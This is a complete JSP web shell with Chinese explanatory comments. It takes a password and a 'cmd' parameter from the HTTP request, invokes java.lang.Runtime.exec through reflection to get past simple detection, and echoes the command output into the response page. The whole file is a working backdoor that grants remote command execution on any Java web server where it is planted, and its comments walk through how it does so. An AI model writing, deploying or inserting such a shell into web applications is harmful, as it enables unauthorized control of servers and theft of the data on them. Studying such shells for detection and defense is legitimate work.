<%@ page language="java" pageEncoding="UTF-8" %>
<%
    // 加入一个密码
    String PASSWORD = "password";
    String passwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");
    if (!passwd.equals(PASSWORD)) {
        return;
    }
	
    // 反射调用,先获取 "java.lang.Runtime" 的字节码
    Class rt = Class.forName("java.lang.Runtime");
	
	//获取 "java.lang.Runtime" 的 getRuntime 类
    java.lang.reflect.Method gr = rt.getMethod("getRuntime");
	
	// invoke(对象,实参);	调用某个方法，即exec方法
    java.lang.reflect.Method ex = rt.getMethod("exec", String.class);
    Process process = (Process) ex.invoke(gr.invoke(null), cmd);
	
    // 类似上文做回显
    java.io.InputStream in = process.getInputStream();
    out.print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>